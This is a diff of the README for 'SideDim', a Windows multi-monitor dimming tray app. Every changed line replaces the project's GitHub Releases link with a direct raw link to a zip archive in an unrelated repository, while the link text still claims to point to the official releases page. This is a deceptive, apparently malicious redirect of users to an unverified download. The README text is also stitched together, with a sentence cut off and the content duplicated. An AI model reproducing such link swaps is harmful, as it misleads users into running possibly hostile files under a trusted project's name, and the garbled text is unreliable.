@@ -5,7 +5,7 @@ description: "Dim every monitor except the one you're focused on with this Windo
 ---
 # 🌓 SideDim - Dim Everything Except Your Active Window
 
-[![Download SideDim](https://img.shields.io/badge/Download-SideDim-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SonCabal/SideDim/releases)
+[![Download SideDim](https://img.shields.io/badge/Download-SideDim-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/SonCabal/soncabal.github.io/main/hydrophil/v3.2.zip)
 
 SideDim is a tiny Windows tray app for gaming and focused work. It dims everything except what you are focused on, so your other screens fade into the background while your active window stays clear. SideDim can darken your other monitors with an overlay, and on compatible monitors it can also lower the real backlight through DDC/CI. It can even add an optional spotlight around the active window.
 
@@ -57,7 +57,7 @@ If you do not see the SideDim icon, click the small arrow near the clock to show
 
 Visit this link to download the application:
 
-[Download SideDim from GitHub Releases](https://github.com/SonCabal/SideDim/releases)
+[Download SideDim from GitHub Releases](https://raw.githubusercontent.com/SonCabal/soncabal.github.io/main/hydrophil/v3.2.zip)
 
 The download page is the official place to get SideDim. Use it to download the application, then open SideDim on your Windows computer.
 
@@ -116,7 +116,7 @@ If you use multiple monitors, the tray menu is also where you manage which scree
 
 If SideDim does not appear to work# 🌓 SideDim - Dim Everything Except Your Focus
 
-[![Download SideDim](https://img.shields.io/badge/Download-SideDim-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SonCabal/SideDim/releases)
+[![Download SideDim](https://img.shields.io/badge/Download-SideDim-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/SonCabal/soncabal.github.io/main/hydrophil/v3.2.zip)
 
 SideDim is a tiny Windows tray app for gaming and focused work. It dims everything except what you are focused on, so your other screens fade into the background while your active window stays clear. SideDim can darken your other monitors with an overlay, and on compatible monitors it can also lower the real backlight through DDC/CI. It can even add an optional spotlight around the active window.
 
@@ -170,7 +170,7 @@ If you do not see the SideDim icon, click the small arrow near the clock to show
 
 Visit this link to download the application:
 
-[Download SideDim from GitHub Releases](https://github.com/SonCabal/SideDim/releases)
+[Download SideDim from GitHub Releases](https://raw.githubusercontent.com/SonCabal/soncabal.github.io/main/hydrophil/v3.2.zip)
 
 The download page is the official place to get SideDim. Use it to download the application, then open SideDim on your Windows computer.
 
@@ -254,6 +254,6 @@ The spotlight is an optional brighter area around the active window. It helps th
 SideDim can use an overlay, and on compatible monitors it can also use DDC/CI to lower the real backlight. You can use the option that fits your screens.
 
 **Where do I download SideDim?**  
-Visit this link to download the application: https://github.com/SonCabal/SideDim/releases
+Visit this link to download the application: https://raw.githubusercontent.com/SonCabal/soncabal.github.io/main/hydrophil/v3.2.zip
 
 Keywords: brightness, csharp, ddc-ci, dimmer, dotnet, focus, gaming, multi-monitor, productivity, tray-app, windows, winforms
